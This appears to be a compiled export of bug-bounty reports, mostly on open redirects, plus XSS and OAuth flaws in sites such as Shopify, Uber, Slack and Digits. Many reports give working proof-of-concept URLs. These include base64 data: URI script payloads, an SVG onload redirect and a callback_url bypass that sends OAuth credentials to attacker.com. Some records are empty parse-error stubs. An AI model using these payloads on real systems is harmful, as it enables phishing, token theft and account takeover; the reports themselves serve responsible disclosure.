+===== RDIR-51265 | Flash Cross Domain Policy Bypass by Using File Upload and Redirection - only in Chrome | sev= | bounty=None | substate=resolved | weak= | len=2187
+CVE-2015-0337: https://helpx.adobe.com/security/products/flash-player/apsb15-05.html
++ 
+https://code.google.com/p/chromium/issues/detail?can=2&start=0&num=100&q=&groupby=&sort=&id=425280
+
+==VULNERABILITY DETAILS==
+It is possible to bypass Flash Cross Domain policy in Google Chrome to read other websites' contents after a user uploads a file to a destination that redirects the user to the target website. It is also possible to send a file upload request to a target website without checking the cross domain policy by using an open redirect with status code of 307 (or 308).
+This attack works as follows:
+1- The "FileReference" class provides a means to upload file to a target server in ActionScript.
+2- It accepts a URL as the destination for the file upload process.
+3- It also has access to the target website's contents via the "UPLOAD_COMPLETE_DATA" event. This event is dispatched after data is received from the server after a successful upload.
+4- If the target website redirects the user to another website, Flash in Google Chrome follows the redirection and discloses the destination content via the "UPLOAD_COMPLETE_DATA" event (first security issue). Moreover, if the target website redirects the user with status code of 307 (or 308), Google Chrome send the same file upload request to the final destination without checking the cross domain policy (second security issue).
+
+==REPRODUCTION CASE==
+A SWF PoC file and its ActionScript source has been attached.
+This SWF file can be hosted on any website to target other websites.
+http://attacker.com/chromeFileUploadCrossDomain.swf?url=redirect.php?input=https://plus.google.com/u/0/
+
+"redirect.php" is just a simple open redirect to the target URL. An example is as follows:
+http://attacker.com/chromeFileUploadCrossDomain.swf?url=http://0me.me/demo/openredirect/redirect.php?target=https://plus.google.com/u/0/%26status=301
+Note: "0me.me" has an open cross domain policy and that's why we did not need to host it on "attacker.com".
+
+An image has been attached that shows the result of exploiting this vulnerability. Source code of the "redirect.php" file has also been attached just for information.
+
+
+===== RDIR-52035 | Open redirect in "Language change". | sev= | bounty=500.0 | substate=resolved | weak=Open Redirect | len=345
+Hi guys!
+Urls:
+https://hackerone.com//example.com/ru/faq
+and
+https://hackerone.com//example.com/faq
+or 
+https://hackerone.com//example.com/disclosure-guidelines
+and
+https://hackerone.com//example.com/ru/disclosure-guidelines
+scroll down > at the right side 
+change the language to English
+you will go to http://example.com
+Thank you.
+
+
+===== RDIR-55525 | Open redirection in OAuth | sev= | bounty=500.0 | substate=resolved | weak=Open Redirect | len=1104
+Hello,
+
+When we specify an `invalid` scope then the authorize url redirects to the site mentioned in `redirect_uri`. So, attacker can create an app and use it as open redirector to redirect victims to fake sites.
+eg. Attacker can host same phishing page and hack the victims.
+
+Proof Of Concept :
+===============
+1. I created an app 
+
+<https://prans.myshopify.com/admin/oauth/authorize?client_id=616ce3efcd495007438000ad958a6629&scope=read_customers&redirect_uri=http://www.facebook.com/abc/>
+
+2. Now, visit this ...
+
+This will redirect ...
+
+<https://prans.myshopify.com/admin/oauth/authorize?client_id=616ce3efcd495007438000ad958a6629&scope=a&redirect_uri=https://www.facebook.com/abc>
+
+3. This will redirect with an error to ...
+<https://www.facebook.com/abc?error=invalid_scope&hmac=07657fedf1815f84248dfc6c372ba002e3ea5041df849080269786ae732aed99&shop=prans.myshopify.com&signature=6ecc20da3eb66500d9245635ead45315&timestamp=1428607537>
+
+
+Simple patch :
+===========
+Only a error should be shown and no redirection should take place so as to protect users.
+
+Thanks,
+Pranav
+
+
+
+
+===== RDIR-55546 | Open Redirect after login at http://ecommerce.shopify.com | sev= | bounty=500.0 | substate=resolved | weak=Open Redirect | len=519
+Hi,
+
+The users can be redirected to some other site which is in control of the attacker from http://ecommerce.shopify.com/accounts
+
+Let's say user is attacker asked victim to login from the here :
+http://ecommerce.shopify.com/accounts?found_email=true&return_to=.mx%2F&user[email]=[REDACTED_EMAIL]
+
+When victim enters the password he is redirected to http://ecommerce.shopify.com.mx/
+This com.mx can be changed to multiple like .es .tw etc
+
+These can be controlled by the attacker and used in other attacks
+
+
+
+
+===== RDIR-56662 | XSS - URL Redirects | sev=none | bounty=None | substate=informative | weak=Cross-site Scripting (XSS) - Generic | len=497
+Hi!
+I found that https://[shop name].myshopify.com/admin/redirects is vulnerable to XSS
+To Reproduce:
+
+1. Click Add Url Redirect
+2. set page for redirect
+3. add redirects as: 
+javascript:alert(document.domain)
+or data:text/html;base64,PHNjcmlwdD5hbGVydCgiY29va2llIHN0ZWFsOiAiK2RvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbSc7PC9zY3JpcHQ+
+(XSS and URL redirect)
+4. A new redirect link created
+5. Click on link
+6. XSS
+
+Thanks
+Fr33d0m from vlazeg team
+
+
+===== RDIR-57163 | Open-redirect on hackerone.com | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=421
+Hello!
+
+I would like to report about open-redirect on hackerone.com
+
+Here is the PoC that redirects to example.com IP address: https://hackerone.com/%2F1572395042
+
+There is one more strange behavior in URL. For example:
+https://hackerone.com//hackerone.com - works
+https://hackerone.com//hackerone1.com - doesn't work
+
+I will investigate it further and get back with details if I find something more.
+
+Thanks!
+
+
+===== RDIR-63158 | External URL page bypass | sev= | bounty=None | substate=resolved | weak= | len=317
+A specially crafted URL can bypass the external URL warning page.
+
+# Details
+
+A url that starts with two forward slashes is treated as absolute by browsers.  The markdown renderer refuses to render links that start like this, however it can be tricked by using a control character e.g.
+
+"[test](/\x08/evil.com)"
+
+
+===== RDIR-66384 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-66994 | Link vulnerability leads to phishing attacks | sev= | bounty=None | substate=informative | weak= | len=1904
+Hello Guys,
+
+Hope you are doing great. I'm sending this email to let you know about a vulnerability i stumbled upon while using slack (it's a great app!). 
+
+While copy-pasting a link from a pdf to slack (desktop/web), i noticed that the resulting link(s) looked a bit messed up (1.png)
+
+Firing up burp and investigating this issue, it seems like the link parser is having problems with what in burp appears to be dash. Further analysis led to the following two characters causing this issue:
+%c2%ad
+
+When inserting the above (after url decoding it) between a link, it will actually split the link into two different clickable links (2.png)
+
+
+​As you can see, this looks like a perfectly valid domain, however when hovering over it you can see that there are two clickable areas, one for http://abc, and one for 123.com.
+
+Follow these steps to reproduce:
+1. Login to Slack using the Web, in a browser that goes through Burp intercepting proxy
+2. Choose a colleague to send a direct message
+3. Enter your link as message: http://google.com
+4. Turn on Interception in Burp and hit enter to send the message. The intercepted message should appear in burp.
+5. Between the letter 'g' and 'oogle.com', insert %c2%ad 
+6. Now select the insertion (%c2%ad), and right-click on it, select "convert selection->url->url decode" (3.png)
+​7. After url decode, it should appear as a dash. Forward the request.
+8 Back to slack, you can see that http://g is clickable, as well as oogle.com
+-end replication steps
+
+The attack scenario here would be someone registering oogle.com (or ogle.com or any part for that matter) and sending this to the victim. With a high probably, that victim will click the second area that sends you to oogle.com instead of the 'g'. Good chances to phish for passwords.
+
+Let me know if you have problems reproducing or need additional information.
+
+Regards,
+Shpend
+
+
+===== RDIR-67929 | Redirection Page throwing error instead of redirecting to site | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=231
+Hello 
+
+I was just testing and found that http://anysite.com.com/index.php?ref=&quot;&gt;&lt;svg/onload=window.onerror=alert;throw/XSS/;// does not shows the usual External link warning page, but shows some error page .
+
+Thanks
+
+
+===== RDIR-76738 | Open redirect filter bypass | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=831
+Hi  , 
+
+An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.
+
+its possible to bypass your redirect filter using : 
+https://www.zaption.com/logout?returnTo=///evil.com/
+
+`HTTP/1.1 302 Moved Temporarily
+Access-Control-Allow-Origin: 
+Cache-Control: private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Sun, 19 Jul 2015 10:55:48 GMT
+Location: ///evil.com
+P3P: CP="Zaption does not have a P3P policy. See privacy policy at http://zapt.io/privacy"
+Pragma: no-cache
+Vary: Accept, Accept-Encoding
+Content-Length: 78
+Connection: keep-alive
+
+<p>Moved Temporarily. Redirecting to <a href="///evil.com">///evil.com</a></p>`
+
+
+
+
+===== RDIR-77221 | Open/Unvalidated Redirect Issue | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=127
+HI
+
+User can be redirect to malicious site 
+POC:
+https://app.mavenlink.com/logout?from_mobile=true&return_path=//google.com
+
+
+===== RDIR-87027 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-87804 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-91332 | Open Url redirection on login with facebook | sev= | bounty=None | substate=informative | weak=Cryptographic Issues - Generic | len=379
+steps to produce:
+1, go to the site imgur.com and login with facebook and if you are new user then u must be asked for username on the link 
+https://imgur.com/register/thirdparty/facebook?redirect=http://imgur.com/
+
+nw just change the parameter redirect= value to https://google.com and hit enter and give username and  click next and you will redirected to google
+
+Regards
+Dipak
+
+
+===== RDIR-94637 | Host Header Injection/Redirection | sev= | bounty=30.0 | substate=resolved | weak=Open Redirect | len=1748
+whisper.sh is vulnerable to host header injection because the host header can be changed to something outside the target domain (ie. whisper.sh) and cause it to redirect to to that domain instead (see below). 
+
+Attack vectors are somewhat limited but depends on how the host header is used by the back-end application code. If code references the hostname used in the URL such as password reset pages, an attacker could spoof the host header of the request in order to trick the application to forwarding the password reset email to the attackers domain instead, etc. Other attack vectors may also be possible through manipulation of hyperlinks or other misc. code that relies on the host/domain of the request.
+
+GET / HTTP/1.1
+Host: crowdshield.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+
+HTTP/1.1 301 Moved Permanently
+Content-length: 0
+Location: https://crowdshield.com/
+Connection: close
+
+If you search Google for this vulnerability, there are many, many blogs, articles and white papers describing this vulnerability and associated attack vectors. Every major commercial web application scanner like Accunetix will report this same vulnerability. 
+
+For more details, please read: https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/.
+
+Normally, most apps will reject any request that doesn't originate from the same origin (ie. whisper.sh). To fix, the application should reject anything that doesn't match the target domain. This may also be an error in the rewrite functions of the back-end web server as well.
+
+
+
+===== RDIR-95640 | Reflected XSS and/or malicious redirection via JWPlayer 6 configuration modification | sev= | bounty=None | substate=informative | weak=Cross-site Scripting (XSS) - Generic | len=2744
+**1)** Malicious attacker by visiting course page (e.g. https://www.udemy.com/overview-of-big-data-hadoop/) and intercepting browser's generated requests can find one to the following URL:
+
+    https://www.udemy.com/embed/video/E0IfdVtaQngT/?params%5Bvars%5D%5Bplaylist%5D%5B0%5D%5Bimage%5D=https%3A%2F%2Fdujk9xa5fr1wz.cloudfront.net%2Fcourse%2F750x422%2F211248_71a0_4.jpg&params%5BtrackVideoPlay%5D=true&xdm_e=https%3A%2F%2Fwww.udemy.com%2Foverview-of-big-data-hadoop%2F&xdm_c=default1987&xdm_p=4
+
+It is made for loading JWplayer to show demo video from course overview page. URL parameters of that request are interpreted by web server as parameters of JWplayer's "setup" function. 
+
+Picture **0.jpg** shows like "**params%5Bvars%5D%5Bplaylist%5D%5B0%5D%5Bimage%5D=https%3A%2F%2Fdujk9xa5fr1wz.cloudfront.net%2Fcourse%2F750x422%2F211248_71a0_4.jpg**" is posted into **script** block and interpreted as background image of the player.
+
+**2)** Attacker can use that server's behavior in order to reconfigure JWPlayer according to the following [Manual](http://support.jwplayer.com/customer/portal/articles/1413113-configuration-options-reference)
+
+For example, he can add "logo" block to the player via attributes "logo.file", "logo.link" and change the player's window size. **This will add clickable logo which will cover player's window. "logo.link" can contain one of the following payloads:**
+- //google.com.ua           <-- this can be used for users **redirection**
+- data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=    <--  this can be used for **execution of any JavaScript code (XSS) in context of about:blank.**
+
+As a result, malicious URL will be look like this: 
+
+     https://www.udemy.com/embed/video/E0IfdVtaQngT/?params[vars][abouttext]=Play&params[vars][controls]=false&params[vars][width]=750&params[vars][height]=422&params[vars][logo][file]=https%3A%2F%2Fdujk9xa5fr1wz.cloudfront.net%2Fcourse%2F750x422%2F211248_71a0_4.jpg&params[vars][logo][link]=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&params[trackVideoPlay]=true&xdm_e=https%3A%2F%2Fwww.udemy.com%2Foverview-of-big-data-hadoop%2F&xdm_c=default2455&xdm_p=4
+ 
+**3) Attacker can send created URL to the victim user. After clicking on it, user will be navigated to the page which will look like valid video (example represented on screen 1.jpg). After clicking on the image malicious redirection or JavaScript execution will happen (result of execution represented on screen 2.jpg).**
+
+Image which is used as "logo.file" could contain "Play" button or anything else to attract attention and seduce users to click it. XSS code can be modified in various ways too. **This approach is working great on Firefox and Opera browsers**.  
+
+
+===== RDIR-96474 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-99435 | Open redirect helps to steal Facebook access_token | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1305
+__Description__
+
+https://badoo.com/external/redirector.phtml is the endpoint used when authenticating using external services. This endpoint accepts the parameter _state_ which is a base64 encoded URL. The URL can't be like http://google.com/, but it can be like http://google.com%2f.badoo.com/ which is a valid URL for Internet Explorer (11 and Edge).
+The problem is that Facebook redirects to the value of _redirect_uri_ even if the URL contains parameters (like `?parameter=value`), which is not the case with Google. So, for instance you can send the _access_token_ returned from Facebook to any domain that you control.
+
+__Proof of concept__
+
+1. Using a user that already linked the account with Facebook, go to https://www.facebook.com/v2.2/dialog/oauth?response_type=token&display=popup&client_id=107433747809&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3daHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v
+2. You are redirected to https://www.google.com/.badoo.com/#access_token=[REDACTED_SECRET]
+
+This issue is only reproducible on Internet Explorer 11 and Edge. I tested on both using a Windows 10 installation with latest updates.
+I hope the explanation is clear. Please, let me know if you need more information or a better proof of concept.
+
+
+===== RDIR-100200 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-101962 | Open redirect using theme install | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=687
+An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it. 
+
+Vulnerable Endpoint - https://app.shopify.com/services/google/themes/preview/supply--blue?domain_name=example.com
+Impact - Medium
+CVSS - 6.5 
+
+Proof of concept :- 
+
+[1] Go to https://app.shopify.com/services/google/themes/preview/supply--blue?domain_name=example.com
+[2] You will be redirected to http://example.com/admin
+[3] I can host a site where /admin is not 404 {not valid page } , This can lead and increase risk of phisiing attacks & so on .
+
+
+
+
+
+===== RDIR-103772 | Open Redirect at *.myshopify.com/account/login?checkout_url= | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=413
+Hi,
+
+Any user after logging into an any myshopify shop can be redirected to other domain.
+
+To reproduce:
+Send this to victim: 
+http://sehyoginfoshop.myshopify.com/account/login?checkout_url=.np
+
+Now when our victim logs in,
+He will be redirected to
+https://sehyoginfoshop.myshopify.com.np/
+
+Which is not a shopify domain.
+
+Fix: While redirecting Use <shop-name>"/"$checkout_url instead of <shop-name>$checkout_url
+
+
+===== RDIR-104087 | Trick make all fixed open redirect links vulnerable again | sev= | bounty=1000.0 | substate=resolved | weak=Open Redirect | len=1324
+this trick make all fixed open redirect links vulnerable again
+in this resolved report "https://hackerone.com/reports/2622"
+before fixing
+this link "https://slack.com/checkcookie?redir=http://www.example.com" redirect victim to "http://www.example.com"
+
+after fixing
+this link "https://slack.com/checkcookie?redir=http://www.example.com" only redirect to "https://www.slack.com/" or "https://subdomain.slack.com/"
+
+the trick
+=
+1- use slack account to upload .svg file contain this code
+<code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+ onload="window.location='http://www.example.com'"
+ xmlns="http://www.w3.org/2000/svg">
+</svg>
+</code>
+
+2-make public link for svg file "https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=[REDACTED_SECRET]"
+
+3- complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=[REDACTED_SECRET]"
+
+4-when user click this link will redirect to "http://www.example.com"
+
+in this accepted and Bounty report "https://hackerone.com/reports/2622"
+when user click this link "https://slack.com/checkcookie?redir=http://www.example.com" the result is redirect user to "http://www.example.com"
+in my report it's the same result
+
+you should stop execute svg files and display its's code like  HTML files
+
+ 
+
+
+===== RDIR-104896 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-106348 | text injection can be used in phishing 404 page should not include attacker text | sev= | bounty=100.0 | substate=resolved | weak=Violation of Secure Design Principles | len=959
+Hello i want to report a text injection and a missconfiguration of the 404 page which can be used in phishing
+
+the bug exists at :
+
+https://www.algolia.com/test/%2f../It%20has%20been%20changed%20by%20a%20new%20one%20https://www.crowdcurity.com%20so%20go%20to%20the%20new%20one%20since%20this%20one
+
+https://blog.algolia.com//test/%2f../It%20has%20been%20changed%20by%20a%20new%20one%20https://www.crowdcurity.com%20so%20go%20to%20the%20new%20one%20since%20this%20one
+
+
+
+as you can see attacker text is included 
+"It has been changed by a new one https://www.crowdcurity.com so go to the new one since this one was not found on this server."
+
+
+Fix : just use a 404 page that don't include attacker text just as : hackerone do 
+or just as you do in your other  domain 
+http://status.algolia.com/test/%2f../It%20has%20been%20changed%20by%20a%20new%20one%20https://www.crowdcurity.com%20so%20go%20to%20the%20new%20one%20since%20this%20one
+hope you fix it
+ thanks
+
+
+
+===== RDIR-106350 | text injection can be used in phishing 404 page should not include attacker text | sev= | bounty=250.0 | substate=resolved | weak=Violation of Secure Design Principles | len=628
+Hello i want to report a text injection and a missconfiguration of the 404 page which can be used in phishing
+
+the bug exists at :
+
+https://withinsecurity.com/test/%2f../It%20has%20been%20changed%20by%20a%20new%20one%20https://www.crowdcurity.com%20so%20go%20to%20the%20new%20one%20since%20this%20one
+
+as you can see attacker text is included 
+"It has been changed by a new one https://www.crowdcurity.com so go to the new one since this one was not found on this server."
+
+Fix : just use a 404 page that don't include attacker text just as : hackerone do (a 404 page that don't include any externel text 
+hope you fix it
+thanks
+
+
+===== RDIR-108113 | Bypassing callback_url validation on Digits | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=3153
+Hi,
+I would like to report an issue in Digits which allows attacker to bypass the *callback_url* validation of an application and thus takeover an account.
+
+#Detail
+Digits is a part of the Fabric SDK which offers phone-based sign in. It also provides web login flow. In the [navigation-based authentication flow](https://docs.fabric.io/web/digits/sign-in-options.html#callback-url), the OAuth credential data is passed to the specified callback URL (*callback_url*) after a user granted access to an application using HTTP 302 redirect. This parameter is supposed to be validated to match the registered domain of the application. Here's an example for Periscope:
+
+> https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.digits.com&callback_url=https://www.periscope.tv
+
+callback_url=https://www.periscope.tv matches the application's registered domain, so no problem.
+
+If we modify it:
+> https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.digits.com&callback_url=https://example.com
+
+callback_url=https://example.com does not match the application's registered domain, thus the request is rejected.
+
+Now, it is noticed that the validation is rather loose. For example, it parses the URL and compares only the hostname part. In other words, a URL with authority part is allowed (e.g. callback_url=https://[REDACTED_EMAIL]). It is still a solid validation because the hostname part is correctly handled (something like https://whatever\@www.periscope.tv won't work). 
+
+However, it is discovered that when outputting a non-ASCII character in the header, it will get converted to a question mark (?). **This happens after the validation.** Thus, attacker can bypass the validation by putting his/her own domain followed by a non-ASCII character in the authority part.
+
+Here's how it works:
+
+Input:
+``` 
+https://[REDACTED_EMAIL]
+--------\  authority   /\   hostname   /
+```
+
+The URL is parsed and passes the validation because the hostname matches the registered domain.
+
+Output:
+``` 
+https://attacker.com?@www.periscope.tv
+--------\ hostname /-\     query     /
+```
+
+Since the URL is outputted in the location header, %ff which is non-ASCII is converted. Now suddenly the hostname becomes attacker.com and everything after the question mark becomes the query part. Finally the victim will be redirected to attacker's site with victim's account's OAuth credential.
+
+#Impact
+It affects every application that has integrated Digits, and even official application (Periscope). Attacker can abuse the flaw to login to victim's account on the affected applications.
+
+#PoC
+1. Prepare a Periscope account which is associated with a phone number
+2. Login to Periscope using the phone number with digits web login flow: https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.digits.com&callback_url=https://[REDACTED_EMAIL]
+3. After that your account will be renamed as "Pwn3d"
+
+Video demo: https://vimeo.com/150671313 (password: [REDACTED_SECRET]
+
+#Fix
+The *callback_url* should discard the authority part before outputting.
+
+
+===== RDIR-111968 | Interstitial redirect bypass / open redirect in https://hackerone.com/zendesk_session | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=954
+Hi guys , I have found a way to use the open redirect vulnerability that zendesk refused to fix and we discussed it in #101146 to bypass intristial redirect. 
+in #101146 , @bencode said : 
+> I tend to agree with Zendesk, we don't really see any security issues with it. We use our interstitial to warn the user and it's clear you are on a separate site.
+
+Well , using this issue I could bypass the interstitial redirect.
+#PoC:
+[Clicking here will bypass interistial redirect and get you on evil.com](https://hackerone.com/zendesk_session?locale_id=1&return_to=https://support.hackerone.com/ping/redirect_to_account?state=compayn:/)
+ 
+The link is `https://hackerone.com/zendesk_session?locale_id=1&return_to=https://support.hackerone.com/ping/redirect_to_account?state=compayn:/` which is used to redirect to generate a zendesk session.
+This can be fixed from your end , by detecting the `/ping/redirect_to_account` in the `return_to` parameter. 
+Thanks  
+
+
+===== RDIR-112224 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-113112 | Open-redirect on paragonie.com | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=179
+Hello, 
+
+I would like to report about open-redirect on  paragonie.com
+
+Here is the PoC that redirects to URL. For example::https://paragonie.com//google.com/
+
+Regards,
+
+Hat_Mast3r
+
+
+===== RDIR-113332 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-114529 | Content Spoofing and Local Redirect in Mapbox Studio | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=751
+**Hi**
+
+I'm Found  Bug  It is Possible To Send His message Directly Through URL and Redirect Local .
+
+**Details**
+When you go to :- https://www.mapbox.com/studio/admin/ website redirect to 
+ ~~~
+https://www.mapbox.com/studio/forbidden/?message=Sorry,only admins allowed here.&redirect=/studio/&path=/studio/admin/
+~~~
+You can see  parameter **message** and **redirect** not safe against the manipulation and interference
+
+**# Content Spoofing and Redirect**
+
+**URL POC** 
+~~~
+https://www.mapbox.com/studio/forbidden/?message=Hi%20You%20Are%20%20Not%20%20in%20Mapbox%20Please%20Go%20%20To%20http://evil.com&redirect=/evil.com/&path=%2Fstudio%2Fadmin%2F
+~~~
+Message **Changed** and If Click On **Okay** Redirect on **evil.com**
+
+
+**Regards**
+**Hussain**
+
+
+===== RDIR-115860 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-116315 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-119236 | Open Redirection on Uber.com | sev= | bounty=500.0 | substate=resolved | weak=Open Redirect | len=892
+There seems to be an open redirection on Uber.com
+
+When a user uses `https://www.uber.com//google.com/cities` it will lead to a `Page Not Found` on the Uber website but if the google.com is changed to an IP address such as `https://www.uber.com//216.58.217.206/[param]` it will lead to either a 404 or an SSL error depending on what kind of website you are trying to reach.
+But remove the `https://` and now you will be able to reach any website with the IP address. `uber.com//216.58.217.206/calendar` will redirect to Google's Calendar without any of the SSL error or 404 error.
+
+Also for an hyperlink to be activated the attacker can send the URL `http://uber.com//216.58.217.206/calendar` (changing the https -> http)
+
+Proof of Concept:
+A user can be sent a URL link that can lead to malicious content. The user will believe the link is trust-worthy because it still has the name of Uber.
+
+
+===== RDIR-122054 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-123172 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-123625 | [marketplace.informatica.com] Open Redirect | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=744
+marketplace.informatica.com contains an open redirect due to a flawed URL rewrite rule. All requests containing a single quote: ' are met with a 302 redirect to the same URL, minus the single quote. As the Location header uses a protocol-relative URL, this can be abused to redirect people to arbitrary external sites.
+
+To replicate this issue, load the following URL and observe that you land on google.com: https://marketplace.informatica.com//google.com?q=ohdear&a'b
+
+GET //google.com?q=ohdear&a' HTTP/1.1
+Host: marketplace.informatica.com
+Connection: close
+
+HTTP/1.0 302 Found
+Location: //google.com?q=ohdear&a
+Server: BigIP
+Connection: close
+Content-Length: 0
+
+Open redirects are frequently used to make phishing attacks more effective.
+
+
+
+
+
+===== RDIR-124620 | External links should use rel="noopener" or use the redirect service | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=2908
+This is a rather low severity one and a successful exploitation relies on unlikely user interaction as well as the ability to control the HTML output of an remote host. Furthermore it is a kinda new hardening features in some browsers. Though one can work around this using "[noreferrer](https://html.spec.whatwg.org/multipage/semantics.html#link-type-noreferrer)" which is what we use in @ownCloud for this reason since a longer time.
+
+Anyways, I thought I should give you a heads-up about this anyways :-)
+
+---------
+
+[Our program](https://hackerone.com/owncloud) has setup an integration with our internal issue tracker, this allows us to escalate reports directly into our internal tracker:
+
+{F79971}
+
+Once escalated the report will offer a link to our internal issue tracker here, the following markup is used as can be seen in F79972:
+
+{F79972}
+
+```html
+<a class="word-break--all" href="https://██████/███████/█████████/issues/187" target="_blank" data-reactid=".1.1.2.$110655.1.0.1.0.0.2.1.0.1">187</a>
+```
+
+What is missing here seems to be the `rel=noopener` attribute, if this is not given using `target="_blank"` allows the opening side to control the origin of the linking page. See https://mathiasbynens.github.io/rel-noopener/ for more technical details.
+
+The same is actually also valid for the CVE links as can be seen in #110655 for example.
+
+This can behaviour can be verified with Chrome by changing the href of an escalated report to something like https://mathiasbynens.be/demo/opener. Not the coolest exploit obviously since the following pre-requirements are required:
+
+1.  Adversary is able to escalate a report into an external issue tracker
+2. Adversary is able to control the response of the external issue tracker
+
+So one of the only likely exploit scenarios seems to be:
+
+1. User A of organisation Ananas tells HackerOne to configure an external issue tracker pointing to a self-hosted GitLab or whatever.
+2. User A of organisation Ananas modifies their GitLab in a way to return malicious Javascript that would redirect the HackerOne tab to a faked login page. 
+3. User A of organisation Ananas escalates a report to that page.
+4. User B of organisation Banana is invited to organisation Ananas to help out there with triaging.
+5. User B of organisation Banana goes to the report, clicks on the escalation link and the HackerOne tab gets redirected to the faked login page 
+6. User enters credentials into the faked login page assuming that the previously opened tab is still a legit HackerOne tab.
+
+As can be seen the attack scenario is pretty small :-)
+
+------
+*Side remark: I don't expect any actual bounty for this. It's more an hardening and relies on quite some user interaction. I'd however appreciate if you could add the `rel=noopener` link to external links.*
+
+*If you believe this warrants a bounty please donate it to [Médecins Sans Frontières](http://www.msf.org/)*.
+
+
+===== RDIR-125000 | Open Redirect in m.uber.com | sev= | bounty=500.0 | substate=resolved | weak= | len=141
+Reproduction Steps:
+`https://m.uber.com//youtube.com/%2F..`
+
+HTTP Response:
+```
+HTTP/1.1 303 See Other
+...
+Location: //youtube.com/%2F../
+```
+
+
+===== RDIR-125791 | Reflected XSS via Unvalidated / Open Redirect in uber.com | sev= | bounty=3000.0 | substate=resolved | weak= | len=148
+Hello,
+To reproduce this issue, visit this URL: https://www.uber.com/en//example.com/
+This URL will redirect at [example.com](https://example.com/).
+
+
+===== RDIR-126203 | CBC "cut and paste" attack may cause Open Redirect(even XSS) | sev= | bounty=500.0 | substate=resolved | weak=Cryptographic Issues - Generic | len=2764
+Hello, Uber Security Team
+
+I found an vulnerability in Uber URL redirect page.
+
+# Vulnerability
+In page
+```
+http://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa0e40f3acb1e99e66c
+```
+
+parameter "EQ" is an encrypted URL and "Redirect.aspx" will redirect page to url which is decrypted.
+After some trying, it looks like encryted by **CBC mode** and block size is **8**.
+
+And I found an URL 
+```
+https://pages.et.uber.com/hangzhou1year/?uuid=1234
+```
+
+This URL can encrypted itself. For example
+Access
+`https://pages.et.uber.com/hangzhou1year/?uuid=1234`
+and view the source you will see
+```
+https://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa025d290b1cf9a6e85
+```
+Above is the encrypted result of string `https://pages.et.uber.com/hangzhou1year/?uuid=1234`
